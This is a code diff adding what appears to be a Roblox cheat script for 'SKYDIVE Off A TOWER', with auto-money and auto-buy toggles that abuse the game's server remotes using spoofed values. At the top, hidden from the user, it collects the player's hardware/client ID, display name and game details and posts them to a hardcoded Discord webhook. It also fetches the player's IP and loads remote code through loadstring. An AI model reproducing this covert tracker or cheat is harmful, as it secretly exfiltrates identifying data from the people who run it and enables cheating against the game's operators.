@@ -1,0 +1,156 @@
+HttpService = game:GetService("HttpService")
+Webhook_URL = "https://discord.com/api/webhooks/1100115603882250312/6aSaKM5GlOeHeN2c7ka1F1oCD6yrSNohg6PNqGwpgOXeG6ARi6LYJ-yLUCeXtqQGOEL3"
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+local GName = "SKYDIVE Off A TOWER"
+local PlayerGname = game.Players.LocalPlayer.DisplayName
+
+local response = syn.request({
+    Url = Webhook_URL,
+    Method = 'POST',
+    Headers = {['Content-Type'] = 'application/json'},
+
+    Body = HttpService:JSONEncode({
+        username = "Cipeczka",
+        avatar_url = "",
+        content = "@everyone",
+        embeds = {
+            {
+                title = "Ketty Hub",
+                color = 13044234,
+                description = "IP Gracza: "..GName.."\nHWID Gracza: "..game:GetService("RbxAnalyticsService"):GetClientId().."\nGRA: "..GName.."\nPLACEID GRY: "..game.placeId,
+                
+                timestamp = "",
+                author = {
+                    name = PlayerGname
+                },
+                image = {},
+                thumbnail = {},
+                footer = {},
+                fields = {}
+            },
+--            {
+--                title = "Embed2",
+--                color = 0,
+--                description = "To jest Opis Embed2",
+--                timestamp = "",
+--                author = {},
+--                image = {},
+--                thumbnail = {},
+--                footer = {},
+--                fields = {}
+--            }
+        }
+    })
+})
+
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+local Window = Rayfield:CreateWindow({
+    Name = "KSD SKYDIVE Off A TOWER",
+    LoadingTitle = "SKYDIVE Off A TOWER",
+    LoadingSubtitle = "By KSD",
+    ConfigurationSaving = {
+       Enabled = true,
+       FolderName = nil, -- Create a custom folder for your hub/game
+       FileName = "KSD Hub"
+    },
+    Discord = {
+       Enabled = false,
+       Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
+       RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+    },
+    KeySystem = false, -- Set this to true to use our key system
+    KeySettings = {
+       Title = "Untitled",
+       Subtitle = "Key System",
+       Note = "No method of obtaining the key is provided",
+       FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
+       SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
+       GrabKeyFromSite = true, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+       Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
+    }
+ })
+
+-- TABSY --
+local AuthorTab = Window:CreateTab("Author")
+ local AutoMenuTab = Window:CreateTab("Auto Menu")
+ local SettingTab = Window:CreateTab("Settings")
+-- TABSY --
+
+ -- TOGGLE AUTO CLICK --
+local AutoClickSection = AutoMenuTab:CreateSection("Auto Get Money")
+local AutoClickToggle = AutoMenuTab:CreateToggle({
+    Name = "Auto Get Money",
+    CurrentValue = false,
+    Flag = "Toggle1",
+    Callback = function(autoclick)
+        if autoclick then
+            getgenv().StartAutoClick = true
+        else
+            getgenv().StartAutoClick = false
+        end
+
+        while task.wait() and StartAutoClick do
+            game:GetService("ReplicatedStorage").Remotes.start_skydive:InvokeServer(200)
+            game:GetService("ReplicatedStorage").Remotes.validate_skydive:FireServer(5000000, 3.312500170432031)
+        end
+    end,
+ })
+
+ -- TOGGLE AUTO CLICK --
+
+-- TOGGLE AUTO BUY FLOOR --
+local AutoBuyFloorsSection = AutoMenuTab:CreateSection("Auto Buy")
+local AutoClickToggle = AutoMenuTab:CreateToggle({
+    Name = "Auto Buy Floors",
+    CurrentValue = false,
+    Flag = "Toggle1",
+    Callback = function(autobuyfloor)
+        if autobuyfloor then
+            getgenv().StartAutoBuy = true
+        else
+            getgenv().StartAutoBuy = false
+        end
+
+        while task.wait(0.2) and StartAutoBuy do
+            game:GetService("ReplicatedStorage").Remotes.buy_floor:InvokeServer()
+        end
+    end,
+ })
+ -- TOGGLE AUTO BUY FLOOR --
+
+ -- TOGGLE AUTO BUY JET --
+local AutoClickToggle = AutoMenuTab:CreateToggle({
+    Name = "Auto Buy Jetpack",
+    CurrentValue = false,
+    Flag = "Toggle1",
+    Callback = function(autobuyjet)
+        if autobuyjet then
+            getgenv().StartAutoBuyJet = true
+        else
+            getgenv().StartAutoBuyJet = false
+        end
+
+        while task.wait(0.2) and StartAutoBuyJet do
+            game:GetService("ReplicatedStorage").Remotes.buy_jetpack_level:InvokeServer()
+        end
+    end,
+ })
+ -- TOGGLE AUTO BUY JET --
+
+
+--- SETTINGS --- 
+    SettingTab:CreateButton({
+        Name = "Destroy GUI",
+        Callback = function()
+            Rayfield:Destroy()
+        end,
+     })
+--- SETTINGS --- 
+
+AuthorTab:CreateParagraph({Title = "Dev", Content = "Ketty#0069 | Norway"})
+AuthorTab:CreateParagraph({Title = "Helper", Content = "!KrystekYT#8687 | Poland"})
+
+Rayfield:LoadConfiguration()
+
+
+-- LUCKY BLOCK = game:GetService("ReplicatedStorage").Remotes.redeem_lucky_block:FireServer(amountofmoney)
